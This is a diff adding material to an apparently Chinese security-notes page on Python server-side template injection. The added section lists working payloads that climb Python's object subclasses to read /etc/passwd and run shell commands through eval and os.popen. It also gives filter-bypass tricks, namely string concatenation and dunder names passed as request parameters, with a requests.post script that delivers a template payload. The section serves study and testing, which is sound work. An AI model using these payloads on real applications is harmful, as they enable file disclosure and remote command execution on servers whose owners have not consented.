@@ -68,6 +68,33 @@ python的新式类都保留了它所有的子类的引用，``__subclasses__()``
 
 因为python中的类都是继承object的，所以只要调用object类对象的 ``__subclasses__()`` 方法就可以获取想要的类的对象。
 
+常见Payload
+----------------------------------------
+- ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
+- ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``
+
+绕过技巧
+----------------------------------------
+
+字符串拼接
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``
+
+使用参数绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+::
+
+    params = {
+        'clas': '__class__',
+        'mr': '__mro__',
+        'subc': '__subclasses__'
+    }
+    data = {
+        "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
+    }
+    r = requests.post(url, params=params, data=data)
+    print(r.text)
+
 参考链接
 ----------------------------------------
 - `服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_
